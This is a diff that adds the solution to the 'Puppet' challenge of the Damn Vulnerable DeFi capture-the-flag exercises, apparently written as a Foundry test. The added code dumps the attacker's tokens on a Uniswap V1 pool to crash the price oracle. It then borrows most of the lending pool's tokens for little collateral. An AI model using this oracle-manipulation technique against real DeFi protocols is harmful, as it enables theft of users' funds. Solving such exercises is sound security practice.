@@ -7,6 +7,8 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
 
+import {Math} from "openzeppelin-contracts/utils/math/Math.sol";
+
 interface UniswapV1Exchange {
     function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
         external
@@ -100,7 +102,29 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        uint256 tokens_sold = dvt.balanceOf(attacker);
 
+        dvt.approve(address(uniswapExchange), tokens_sold);
+
+        // sell all tokens
+        uint256 min_eth = 1;
+        uint256 deadline = block.timestamp * 2;
+        uniswapExchange.tokenToEthSwapInput(tokens_sold, min_eth, deadline);
+
+        // Calculate how much we should pay to borrow a token
+        uint256 ethToBorrowOneToken = puppetPool.calculateDepositRequired(1 ether);
+
+        // Calc how much we can borrow
+        uint256 tokenBorrowable = (attacker.balance * 10 ** 18) / ethToBorrowOneToken;
+
+        // Get the max borrowable tokekns from the pool
+        uint256 maxTokenToBorrow = Math.min(dvt.balanceOf(address(puppetPool)), tokenBorrowable);
+
+        // borrow
+        puppetPool.borrow(maxTokenToBorrow);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
